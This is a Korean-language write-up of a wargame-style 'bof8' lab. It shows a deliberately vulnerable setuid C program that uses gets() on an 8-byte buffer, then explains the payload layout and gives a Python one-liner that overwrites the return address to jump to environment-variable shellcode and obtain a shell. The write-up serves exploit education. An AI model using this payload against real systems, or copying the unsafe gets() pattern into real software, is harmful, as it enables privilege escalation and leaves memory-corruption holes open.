# bof8 정리

## bof8.c 
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON

void vuln() {
    char buf[BUF_SIZE];

    if (setreuid(1008, 1008)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1008, 1008)) {
        perror("setgid");
        exit(1);
    }
    gets(buf);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
}

int main() {
    vuln();
    return 0;
}
```

`buf` 문자열을 입력 받는 `gets` 함수가 취약점이다.

---


## 공격 기법

<br>

환경변수 `SHELLCODE`를 만들고, Buffer Overflow 를 이용해 `vuln` 함수의 Return Address 에 환경변수의 주소를 가질 수 있도록 하고, `ret` 이 수행될 때 shell code가 실행될 수 있도록 만든다.

### 페이로드

| buf | SFP | RET |
| :--: | :--: | :--: |
| Dummy | Dummy | SHELLCODE Address | 
---

## 방법

<br>


![bof8_1](img/bof8_1.png)

먼저 `SHELLCODE`라는 환경변수를 만든다.
```c
 printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
```
이 부분에서 환경변수의 주소를 알려준다.

<br>

![bof8_2](img/bof8_2.png)

Buffer Overflow 를 만들어 Return Address 에 접근을 하려고 하는데 `buf`의 크기가 8, 64bit에서 SFP의 크기는 8이므로 Dummy 값을 16만큼 넣어 그 때의 `buf`의 주소를 확인한다.

<br>

![bof8_3](img/bof8_3.png)

페이로드에 따라 명령어를 작성하면 다음과 같이 된다.
```shell
$ (python -c 'print "a"*16+"\x65\xee\xff\xff\xff\x7f"'; cat) | ./bof8
```
위 명령어를 입력하면 위 사진과 같이 Shell을 따올 수 있음을 확인할 수 있다.
